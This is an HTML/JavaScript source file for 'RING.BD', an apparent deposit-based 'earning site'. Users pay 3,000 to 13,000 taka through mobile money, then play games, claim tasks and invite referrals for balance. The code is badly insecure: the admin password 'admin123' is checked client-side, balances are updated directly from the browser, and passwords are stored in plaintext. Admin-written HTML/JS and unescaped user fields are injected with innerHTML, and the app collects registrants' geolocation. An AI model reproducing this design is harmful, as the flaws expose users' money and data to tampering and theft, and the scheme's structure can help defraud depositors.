<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>RING.BD - Official Earning Site</title>
    <!-- FontAwesome & Google Fonts -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
    
    <style>
        :root {
            /* --- OLD THEME COLORS (Restored) --- */
            --primary: #00bf8f; 
            --primary-dark: #008f6b;
            --secondary: #2c3e50;
            --accent: #f1c40f;
            --bg: #f0f2f5;
            --white: #ffffff;
            --text: #333333;
            --danger: #ff4757;
        }

        * { box-sizing: border-box; font-family: 'Poppins', sans-serif; margin: 0; padding: 0; outline: none; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--bg); color: var(--text); padding-bottom: 80px; user-select: none; }

        /* --- UTILS --- */
        .hidden { display: none !important; }
        .fade-in { animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .btn { border: none; padding: 12px; border-radius: 8px; cursor: pointer; font-weight: 600; width: 100%; transition: 0.2s; font-size: 1rem; margin-top: 10px; color: white; }
        .btn:active { transform: scale(0.96); }
        .btn-primary { background: var(--primary); box-shadow: 0 4px 10px rgba(0,191,143,0.3); }
        .btn-secondary { background: var(--secondary); }
        .btn-danger { background: var(--danger); }
        .btn-outline { border: 2px solid var(--primary); color: var(--primary); background: transparent; }
        
        .input-group { margin-bottom: 15px; text-align: left; }
        .input-group label { display: block; margin-bottom: 6px; font-size: 0.85rem; color: #666; font-weight: 600; }
        .input-group input, .input-group select, .input-group textarea { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; background: #fff; font-size: 1rem; }
        .input-group input:focus { border-color: var(--primary); }

        /* --- LAYOUT --- */
        .screen { max-width: 480px; margin: 0 auto; background: var(--white); min-height: 100vh; position: relative; box-shadow: 0 0 20px rgba(0,0,0,0.05); }
        .header { background: var(--secondary); color: white; padding: 25px 20px 50px 20px; border-radius: 0 0 25px 25px; position: relative; display: flex; justify-content: space-between; align-items: center; }
        
        .balance-card { background: white; color: var(--text); padding: 20px; margin: -35px 20px 20px 20px; border-radius: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; position: relative; z-index: 10; border-top: 5px solid var(--primary); }

        .content { padding: 0 20px; padding-bottom: 20px; }
        
        /* --- MAP CONTAINER --- */
        .map-wrapper { width: 100%; height: 200px; background: #eee; margin-top: 10px; border-radius: 10px; overflow: hidden; border: 1px solid #ccc; position: relative; }
        .map-wrapper iframe { width: 100%; height: 100%; border: 0; }
        
        /* --- CARDS & GAMES --- */
        .task-card { background: white; border: 1px solid #eee; padding: 15px; border-radius: 10px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
        
        /* --- ADMIN CUSTOM GAME --- */
        .code-editor { width: 100%; height: 150px; background: #333; color: #0f0; font-family: monospace; padding: 10px; border-radius: 5px; border: none; resize: vertical; }

        /* --- NAV --- */
        .bottom-nav { position: fixed; bottom: 0; left: 50%; transform: translateX(-50%); width: 100%; max-width: 480px; background: white; border-top: 1px solid #eee; display: flex; justify-content: space-around; padding: 12px 0; z-index: 1000; }
        .nav-item { text-align: center; color: #999; cursor: pointer; flex: 1; }
        .nav-item.active { color: var(--primary); font-weight: bold; }
        .nav-item i { display: block; font-size: 1.4rem; margin-bottom: 4px; }
    </style>
</head>
<body>

<div class="screen">

    <!-- LOADING SCREEN -->
    <div id="loader" style="position:fixed; top:0; left:0; width:100%; height:100%; background:white; z-index:9999; display:flex; flex-direction:column; justify-content:center; align-items:center;">
        <i class="fas fa-circle-notch fa-spin" style="font-size:3rem; color:var(--primary);"></i>
        <h3 style="margin-top:15px; color:var(--secondary);">RING.BD</h3>
    </div>

    <!-- 1. LOGIN PAGE -->
    <div id="view-login" class="hidden fade-in">
        <div class="header" style="justify-content: center; padding-bottom: 80px;">
            <div style="text-align: center;">
                <h1>RING.BD</h1>
                <p>Login to your account</p>
            </div>
        </div>
        <div class="content" style="margin-top: -40px;">
            <div class="balance-card">
                <div class="input-group">
                    <label>User ID</label>
                    <input type="text" id="login-id" placeholder="RING...">
                </div>
                <div class="input-group">
                    <label>Password</label>
                    <input type="password" id="login-pass">
                </div>
                <button class="btn btn-primary" onclick="app.login()">Secure Login</button>
                <button class="btn btn-outline" onclick="nav.to('register')">Register New Account</button>
                <div style="margin-top:20px; font-size:0.8rem; color:#aaa;" onclick="nav.to('admin-login')">Admin Access</div>
            </div>
        </div>
    </div>

    <!-- 2. REGISTRATION PAGE (WITH MAP) -->
    <div id="view-register" class="hidden fade-in">
        <div class="header"><h2>Create Account</h2></div>
        <div class="content" style="margin-top: 20px; overflow-y:auto; height: calc(100vh - 100px);">
            
            <div class="input-group"><label>Name</label><input type="text" id="reg-name"></div>
            <div class="input-group"><label>Mobile</label><input type="number" id="reg-mobile"></div>
            <div class="input-group"><label>Email</label><input type="email" id="reg-email"></div>
            
            <!-- GOOGLE MAP SECTION -->
            <div class="input-group">
                <label>Verification Address (Live Map)</label>
                <button class="btn btn-outline" style="padding: 5px; font-size: 0.8rem;" onclick="app.detectLocation()">
                    <i class="fas fa-map-marker-alt"></i> Detect My Location
                </button>
                <div class="map-wrapper">
                    <!-- Default Map (Bangladesh) -->
                    <iframe id="google-map-frame" src="https://maps.google.com/maps?q=Dhaka,Bangladesh&z=6&output=embed"></iframe>
                </div>
                <input type="hidden" id="reg-coords">
            </div>

            <div class="input-group">
                <label>Deposit Package</label>
                <select id="reg-amount">
                    <option value="3000">Starter - 3,000 ৳</option>
                    <option value="5000">Standard - 5,000 ৳</option>
                    <option value="13000">Pro - 13,000 ৳</option>
                </select>
            </div>
            
            <div class="input-group">
                <label>Payment Method</label>
                <select id="reg-gateway" onchange="app.toggleGateway()">
                    <option value="">Select Gateway</option>
                    <option value="Bkash">Bkash</option>
                    <option value="Nagad">Nagad</option>
                    <option value="Crypt">Binance/Ton</option>
                </select>
            </div>

            <div id="gateway-info" class="hidden" style="background:#fff3cd; padding:10px; border:1px solid #ffeeba; border-radius:5px; margin-bottom:10px;">
                <p>Send Money To: <b id="pay-number">Loading...</b></p>
                <input type="text" id="reg-trx" placeholder="Enter Transaction ID" style="width:100%; margin-top:5px; padding:8px;">
            </div>

            <button class="btn btn-primary" onclick="app.register()">Submit Request</button>
            <button class="btn btn-secondary" onclick="nav.to('login')">Cancel</button>
        </div>
    </div>

    <!-- 3. USER HOME -->
    <div id="view-home" class="hidden fade-in">
        <div class="header">
            <div>
                <h3>Hi, <span class="u-name">User</span></h3>
                <small>Welcome Back</small>
            </div>
            <div style="text-align:right;">
                <h3><i class="fas fa-coins"></i> <span id="u-rc">0</span> RC</h3>
            </div>
        </div>

        <div class="balance-card">
            <p>Main Balance</p>
            <h1>৳ <span id="u-bal">0.00</span></h1>
            <div style="display:flex; gap:10px; margin-top:10px;">
                <button class="btn btn-primary" style="margin:0;" onclick="nav.bottom('withdraw')">Withdraw</button>
                <button class="btn btn-outline" style="margin:0;" onclick="app.copyLink()">Invite</button>
            </div>
        </div>

        <div class="content">
            <!-- Marquee -->
            <div style="background:#e8f5e9; color:#2e7d32; padding:10px; border-radius:5px; margin-bottom:15px; overflow:hidden; white-space:nowrap;">
                <marquee id="site-notice">Welcome to RING.BD</marquee>
            </div>

            <h3>Active Games</h3>
            <div id="dynamic-games-list" style="display:grid; grid-template-columns:1fr 1fr; gap:10px; margin-top:10px;">
                <!-- Standard Game -->
                <div class="task-card" style="display:block; text-align:center;" onclick="nav.bottom('game')">
                    <i class="fas fa-gamepad" style="font-size:2rem; color:var(--primary); margin-bottom:5px;"></i>
                    <h4>Wheel</h4>
                </div>
                <!-- Custom Games Injected Here -->
            </div>
        </div>
    </div>

    <!-- 4. GAME PAGE (Standard Wheel) -->
    <div id="view-game" class="hidden fade-in">
        <div class="header"><h2>Lucky Wheel</h2></div>
        <div class="content" style="text-align:center; padding-top:20px;">
            <div style="width:200px; height:200px; background:conic-gradient(red 0deg 60deg, blue 60deg 120deg, green 120deg 180deg, yellow 180deg 240deg, purple 240deg 300deg, orange 300deg 360deg); border-radius:50%; margin:20px auto; border:5px solid #fff; box-shadow:0 0 10px #ccc; transition:transform 3s;" id="wheel"></div>
            <button class="btn btn-primary" onclick="app.playWheel()">Spin (20 ৳)</button>
        </div>
    </div>

    <!-- 5. PLAY CUSTOM GAME (Dynamic Container) -->
    <div id="view-custom-play" class="hidden fade-in">
        <div class="header">
            <button style="background:none; border:none; color:white; font-size:1.2rem;" onclick="nav.bottom('home')"><i class="fas fa-arrow-left"></i></button>
            <h2 style="margin-left:10px;">Play Game</h2>
        </div>
        <div class="content" id="custom-game-container" style="padding-top:20px;">
            <!-- Admin code renders here -->
        </div>
    </div>

    <!-- 6. TASK PAGE -->
    <div id="view-task" class="hidden fade-in">
        <div class="header"><h2>Daily Tasks</h2></div>
        <div class="content" style="padding-top:20px;" id="task-list">
            <!-- Tasks loaded from JS -->
            <div class="task-card">
                <div><b>Daily Login</b><br><small>Reward: 5 ৳</small></div>
                <button class="btn btn-primary" style="width:auto;" onclick="app.doTask(5)">Claim</button>
            </div>
        </div>
    </div>

    <!-- 7. WITHDRAW -->
    <div id="view-withdraw" class="hidden fade-in">
        <div class="header"><h2>Withdraw</h2></div>
        <div class="content" style="padding-top:20px;">
            <div class="balance-card">
                <h3>৳ <span id="w-bal">0.00</span></h3>
            </div>
            <div class="input-group">
                <label>Method</label>
                <select id="w-method"><option>Bkash</option><option>Nagad</option></select>
            </div>
            <div class="input-group"><label>Number</label><input type="number" id="w-num"></div>
            <div class="input-group"><label>Amount</label><input type="number" id="w-amt"></div>
            <button class="btn btn-primary" onclick="app.withdraw()">Confirm</button>
        </div>
    </div>

    <!-- 8. ADMIN PANEL -->
    <div id="view-admin" class="hidden fade-in" style="background:#eee; min-height:100vh;">
        <div class="header" style="background:#333;">
            <h3>Admin Panel</h3>
            <button onclick="location.reload()" style="background:red; color:white; border:none; padding:5px 10px;">Exit</button>
        </div>
        
        <div style="padding:10px; background:white; overflow-x:auto; display:flex; gap:5px;">
            <button class="btn btn-outline" style="width:auto; padding:5px 10px;" onclick="admin.show('req')">Requests</button>
            <button class="btn btn-outline" style="width:auto; padding:5px 10px;" onclick="admin.show('with')">Withdraws</button>
            <button class="btn btn-outline" style="width:auto; padding:5px 10px;" onclick="admin.show('game')">Add Game</button>
            <button class="btn btn-outline" style="width:auto; padding:5px 10px;" onclick="admin.show('set')">Settings</button>
        </div>

        <div id="adm-content" class="content" style="padding-top:10px;">
            <!-- Content Injected Here -->
        </div>
    </div>

    <!-- ADMIN LOGIN -->
    <div id="view-admin-login" class="hidden fade-in">
        <div class="header"><h2>Admin Security</h2></div>
        <div class="content" style="padding-top:50px;">
            <input type="password" id="adm-pass" placeholder="Password" style="width:100%; padding:10px; margin-bottom:10px;">
            <button class="btn btn-secondary" onclick="admin.login()">Login</button>
            <button class="btn btn-outline" onclick="nav.to('login')">Back</button>
        </div>
    </div>

    <!-- NAVIGATION -->
    <div class="bottom-nav hidden" id="main-nav">
        <div class="nav-item active" id="nav-home" onclick="nav.bottom('home')"><i class="fas fa-home"></i> Home</div>
        <div class="nav-item" id="nav-game" onclick="nav.bottom('game')"><i class="fas fa-gamepad"></i> Game</div>
        <div class="nav-item" id="nav-task" onclick="nav.bottom('task')"><i class="fas fa-tasks"></i> Task</div>
        <div class="nav-item" id="nav-withdraw" onclick="nav.bottom('withdraw')"><i class="fas fa-wallet"></i> Wallet</div>
    </div>

</div>

<!-- FIREBASE SDK -->
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

<script>
    // --- FIREBASE CONFIG (YOUR KEY) ---
    const firebaseConfig = {
        apiKey: "AIzaSyAtfjaSSlaDYUsogHrvBn_6MbEbM-M-O4Q",
        authDomain: "test-g-login-nur.firebaseapp.com",
        projectId: "test-g-login-nur",
        storageBucket: "test-g-login-nur.firebasestorage.app",
        messagingSenderId: "19016505156",
        appId: "1:19016505156:web:72b1480a444317853f6911",
        measurementId: "G-QX5D57GRX8"
    };

    let db;
    try {
        if(!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        db = firebase.database();
    } catch(e) { console.error(e); }

    // --- STATE ---
    let currentUser = null;
    let settings = { notice: "Welcome", payInfo: "017...", gameCost: 20 };

    // --- NAVIGATION ---
    const nav = {
        to: (id) => {
            document.querySelectorAll('[id^="view-"]').forEach(e => e.classList.add('hidden'));
            document.getElementById('view-'+id).classList.remove('hidden');
            if(['login','register','admin','admin-login'].includes(id)) document.getElementById('main-nav').classList.add('hidden');
        },
        bottom: (id) => {
            ['home','game','task','withdraw'].forEach(t => {
                document.getElementById('view-'+t).classList.add('hidden');
                document.getElementById('nav-'+t).classList.remove('active');
            });
            // If viewing custom game, hide standard game view
            document.getElementById('view-custom-play').classList.add('hidden');
            
            document.getElementById('view-'+id).classList.remove('hidden');
            document.getElementById('nav-'+id).classList.add('active');
            document.getElementById('main-nav').classList.remove('hidden');
        }
    };

    // --- MAIN APP ---
    const app = {
        init: () => {
            setTimeout(() => document.getElementById('loader').classList.add('hidden'), 2000);
            db.ref('settings').on('value', s => { if(s.exists()) { settings = s.val(); document.getElementById('site-notice').innerText = settings.notice; } });
            nav.to('login');
        },

        // --- MAP FEATURE ---
        detectLocation: () => {
            const btn = event.target;
            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Detecting...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition((position) => {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    
                    // Update Iframe with Real Location
                    const mapUrl = `https://maps.google.com/maps?q=${lat},${lon}&z=15&output=embed`;
                    document.getElementById('google-map-frame').src = mapUrl;
                    document.getElementById('reg-coords').value = `${lat}, ${lon}`;
                    
                    btn.innerHTML = '<i class="fas fa-check"></i> Location Set';
                    btn.className = 'btn btn-primary';
                }, (error) => {
                    alert("Please allow location access.");
                    btn.innerHTML = 'Retry Location';
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        },

        toggleGateway: () => {
            const gw = document.getElementById('reg-gateway').value;
            const info = document.getElementById('gateway-info');
            if(gw) {
                info.classList.remove('hidden');
                document.getElementById('pay-number').innerText = settings.payInfo;
            } else info.classList.add('hidden');
        },

        register: () => {
            const d = {
                name: document.getElementById('reg-name').value,
                mobile: document.getElementById('reg-mobile').value,
                email: document.getElementById('reg-email').value,
                coords: document.getElementById('reg-coords').value || "Not Set",
                pkg: document.getElementById('reg-amount').value,
                trx: document.getElementById('reg-trx').value,
                status: 'pending',
                date: Date.now()
            };
            if(!d.name || !d.mobile || !d.trx) return alert("Fill all fields");
            
            db.ref('registrations').push(d);
            alert("Request Sent!");
            nav.to('login');
        },

        login: () => {
            const id = document.getElementById('login-id').value;
            const pass = document.getElementById('login-pass').value;
            db.ref('users/'+id).once('value', s => {
                if(s.exists() && s.val().pass === pass) {
                    currentUser = s.val(); currentUser.id = id;
                    app.loadDashboard();
                } else alert("Invalid Login");
            });
        },

        loadDashboard: () => {
            db.ref('users/'+currentUser.id).on('value', s => {
                currentUser = s.val(); currentUser.id = s.key;
                document.querySelector('.u-name').innerText = currentUser.name;
                document.getElementById('u-bal').innerText = currentUser.bal;
                document.getElementById('w-bal').innerText = currentUser.bal;
                document.getElementById('u-rc').innerText = currentUser.rc || 0;
            });
            
            // Load Custom Games
            db.ref('customGames').on('value', s => {
                const list = document.getElementById('dynamic-games-list');
                // Keep standard wheel, clear others
                list.innerHTML = `
                <div class="task-card" style="display:block; text-align:center;" onclick="nav.bottom('game')">
                    <i class="fas fa-gamepad" style="font-size:2rem; color:var(--primary); margin-bottom:5px;"></i>
                    <h4>Wheel</h4>
                </div>`;
                
                s.forEach(g => {
                    const game = g.val();
                    const key = g.key;
                    // Create card for custom game
                    const card = document.createElement('div');
                    card.className = 'task-card';
                    card.style.display = 'block';
                    card.style.textAlign = 'center';
                    card.innerHTML = `<i class="fas fa-puzzle-piece" style="font-size:2rem; color:#f1c40f; margin-bottom:5px;"></i><h4>${game.name}</h4>`;
                    card.onclick = () => app.playCustomGame(game.code);
                    list.appendChild(card);
                });
            });

            nav.bottom('home');
        },

        playWheel: () => {
            if(currentUser.bal < 20) return alert("Low Balance");
            db.ref('users/'+currentUser.id).update({bal: currentUser.bal - 20});
            const w = document.getElementById('wheel');
            w.style.transform = `rotate(${Math.random()*3000}deg)`;
            setTimeout(() => {
                const win = 30;
                db.ref('users/'+currentUser.id).update({bal: currentUser.bal + win});
                alert("Won "+win+" ৳");
                w.style.transform = 'rotate(0deg)';
            }, 3000);
        },

        playCustomGame: (htmlCode) => {
            document.getElementById('view-home').classList.add('hidden');
            document.getElementById('view-custom-play').classList.remove('hidden');
            // INJECT CODE
            const container = document.getElementById('custom-game-container');
            container.innerHTML = htmlCode;
            
            // Helper function for custom games to reward user
            window.claimReward = (amount) => {
                db.ref('users/'+currentUser.id).update({bal: currentUser.bal + amount});
                alert("Custom Game Reward: " + amount + "৳ Added!");
            };
        },

        doTask: (amt) => {
            const b = event.target; b.disabled = true; b.innerText = "Wait...";
            setTimeout(() => {
                db.ref('users/'+currentUser.id).update({bal: currentUser.bal + amt});
                alert("Claimed!");
                b.style.display = 'none';
            }, 2000);
        },

        withdraw: () => {
            const amt = parseInt(document.getElementById('w-amt').value);
            if(amt > currentUser.bal) return alert("Insufficient");
            db.ref('users/'+currentUser.id).update({bal: currentUser.bal - amt});
            db.ref('withdrawals').push({
                uid: currentUser.id, name: currentUser.name,
                amt: amt, num: document.getElementById('w-num').value,
                method: document.getElementById('w-method').value, status: 'pending'
            });
            alert("Sent!"); nav.bottom('home');
        },

        copyLink: () => {
            navigator.clipboard.writeText("https://ring.bd/ref/"+currentUser.id);
            alert("Copied!");
        }
    };

    // --- ADMIN ---
    const admin = {
        login: () => {
            if(document.getElementById('adm-pass').value === 'admin123') {
                nav.to('admin'); admin.show('req');
            } else alert("Wrong");
        },
        show: (tab) => {
            const c = document.getElementById('adm-content');
            c.innerHTML = 'Loading...';
            if(tab === 'req') {
                db.ref('registrations').orderByChild('status').equalTo('pending').on('value', s => {
                    c.innerHTML = '<h4>Registrations</h4>';
                    s.forEach(x => {
                        const d = x.val();
                        c.innerHTML += `<div class="task-card">
                            <div><b>${d.name}</b><br><small>${d.pkg} | Trx: ${d.trx}</small><br><small>Loc: ${d.coords}</small></div>
                            <button class="btn btn-primary" style="width:auto;" onclick="admin.apr('${x.key}','${d.name}','${d.mobile}',${d.pkg})">✓</button>
                        </div>`;
                    });
                });
            } else if(tab === 'with') {
                db.ref('withdrawals').orderByChild('status').equalTo('pending').on('value', s => {
                    c.innerHTML = '<h4>Withdrawals</h4>';
                    s.forEach(x => {
                        const d = x.val();
                        c.innerHTML += `<div class="task-card">
                            <div><b>${d.amt} ৳</b><br><small>${d.method}: ${d.num}</small></div>
                            <button class="btn btn-primary" style="width:auto;" onclick="admin.pay('${x.key}')">Pay</button>
                        </div>`;
                    });
                });
            } else if(tab === 'game') {
                // ADMIN CUSTOM GAME BUILDER
                c.innerHTML = `
                    <h4>Add Custom Game</h4>
                    <div class="input-group">
                        <label>Game Name</label>
                        <input id="new-g-name" placeholder="Ex: Clicker">
                    </div>
                    <div class="input-group">
                        <label>Game HTML/JS Code</label>
                        <small>Use 'claimReward(10)' to give money in JS.</small>
                        <textarea id="new-g-code" class="code-editor" placeholder="<button onclick='claimReward(5)'>Click Me</button>"></textarea>
                    </div>
                    <button class="btn btn-primary" onclick="admin.saveGame()">Upload Game</button>
                    <hr>
                    <h4>Existing Games</h4>
                    <div id="adm-game-list"></div>
                `;
                db.ref('customGames').on('value', s => {
                     const l = document.getElementById('adm-game-list'); l.innerHTML = '';
                     s.forEach(g => {
                         l.innerHTML += `<div style="background:white; padding:5px; margin:5px 0;">${g.val().name} <button onclick="db.ref('customGames/${g.key}').remove()" style="color:red;">Del</button></div>`;
                     });
                });
            } else {
                c.innerHTML = `<h4>Settings</h4><input id="s-n" value="${settings.notice}"><input id="s-p" value="${settings.payInfo}"><button class="btn btn-primary" onclick="admin.saveSet()">Save</button>`;
            }
        },
        apr: (k,n,m,p) => {
            const uid="RING"+Math.floor(1000+Math.random()*9000), pw=Math.random().toString(36).slice(-5);
            db.ref('users/'+uid).set({name:n, mobile:m, pass:pw, bal:50, rc:0});
            db.ref('registrations/'+k).update({status:'approved'});
            alert(`ID: ${uid}\nPass: ${pw}`);
        },
        pay: (k) => db.ref('withdrawals/'+k).update({status:'paid'}),
        saveGame: () => {
            const n = document.getElementById('new-g-name').value;
            const c = document.getElementById('new-g-code').value;
            db.ref('customGames').push({name:n, code:c});
            alert("Game Uploaded!");
        },
        saveSet: () => db.ref('settings').update({notice:document.getElementById('s-n').value, payInfo:document.getElementById('s-p').value})
    };

    window.onload = app.init;
</script>
</body>
</html>
